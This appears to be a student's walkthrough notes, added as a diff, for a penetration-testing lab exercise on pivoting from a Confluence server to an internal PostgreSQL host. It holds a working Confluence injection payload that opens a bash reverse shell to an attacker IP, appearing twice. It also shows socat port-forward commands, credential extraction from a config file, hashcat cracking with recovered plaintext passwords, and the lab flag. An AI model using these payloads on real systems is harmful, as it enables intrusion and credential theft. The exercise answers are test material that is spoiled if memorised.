@@ -1,0 +1,92 @@
+Questions 1
+Follow the steps in this section to set up a port forward and gain access to the confluence database on PGDATABASE01 using psql from your Kali machine. Crack the password of the database_admin user. What is the plain text password of this account?
+
+# To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell.
+
+nc -lvnp 4444
+curl -v http://192.168.155.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.237/4444%200%3E%261%27%29.start%28%29%22%29%7D/
+
+# After decode
+/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/192.168.45.237/4444 0>&1').start()")}/
+
+# Check the listening port 4444 working
+ip addr
+...
+ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:ab:a8:23 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.155.63/24 brd 192.168.155.255 scope global ens192
+       valid_lft forever preferred_lft forever
+ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:ab:75:90 brd ff:ff:ff:ff:ff:ff
+    inet 10.4.155.63/24 brd 10.4.155.255 scope global ens224
+...
+# so there is two interface
+ens192 192.168.155.63 # facing to WAN
+ens224 10.4.155.63 # facing to DMZ
+
+ip route
+default via 192.168.155.254 dev ens192 proto static 
+10.4.155.0/24 dev ens224 proto kernel scope link src 10.4.155.63 
+192.168.155.0/24 dev ens192 proto kernel scope link src 192.168.155.63 
+
+cat /var/atlassian/application-data/confluence/confluence.cfg.xml
+...
+ <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
+    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
+    <property name="hibernate.connection.username">postgres</property>
+...
+
+# Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01.
+
+# On CONFLUENCE01, we'll start a verbose (-ddd) Socat process. It will listen on TCP port 2345 (TCP-LISTEN:2345), fork into a new subprocess when it receives a connection (fork) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (TCP:10.4.50.215:5432)
+
+socat -ddd TCP-LISTEN:6666,fork TCP:10.4.155.215:5432
+
+# Now we can run psql on our Kali machine, specifying that we want to connect to CONFLUENCE01
+psql -h 192.168.155.63 -p 6666 -U postgres
+password: D@t4basePassw0rd!
+
+# We can access to confluence database by using
+\c confluence
+# then
+select * from cwd_user
+...
+alot of credentials
+...
+
+# We receive several rows of user information. 
+# save it to local Kali machine 
+nano hashes 
+hashcat --help | grep -i "Atlassian" 
+12001 | Atlassian (PBKDF2-HMAC-SHA1)  | Framework
+
+hashcat -m 12001 hashes /usr/share/wordlists/fasttrack.txt 
+...
+{PKCS5S2}aBZZw3HfmgYN3Dzg/Pg7GjagLdo+eRg+0JCCVId/KyNT4oVlNbhWPJtJNazs4F5R:Welcome1234
+{PKCS5S2}vCcYx3LxTYB2KH2Sq4wLNLdAcS+4lX/yTQrvBJngifUEXcnIUHEwW0YnOe86W8tP:P@ssw0rd!
+{PKCS5S2}ueMu+nTGBtfeGXGBlXXFcJLdSF4uVHkZxMQ1Bst8wm3uhZcDs56a2ProZiSOk2hv:sqlpass123
+...
+
+# Hashcat returns passwords for the database_admin, hr_admin and rdp_admin users
+
+# We find PGCATABASE01 is also running an SSH server. Lets create a new port forwarding to CONFLUENCE01 and allow us SSH directly from our Kali to PGDATABASE01
+
+nc -lvnp 6677
+curl -v http://192.168.155.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.237/6677%200%3E%261%27%29.start%28%29%22%29%7D/
+
+confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:6622,fork TCP:10.4.155.215:22
+
+ssh database_admin@192.168.155.63 -p6622
+password: sqlpass123
+
+Questions 2
+Capstone Exercise: Use the password found in the previous question to create a new port forward on CONFLUENCE01 and gain SSH access to PGDATABASE01 as the database_admin user. What's the value of the flag found in /tmp/socat_flag on PGDATABASE01?
+
+cat /tmp/socat_flag
+OS{24126cb5839a0f59517dd5741dfca485}
+
+
+
+
+
+
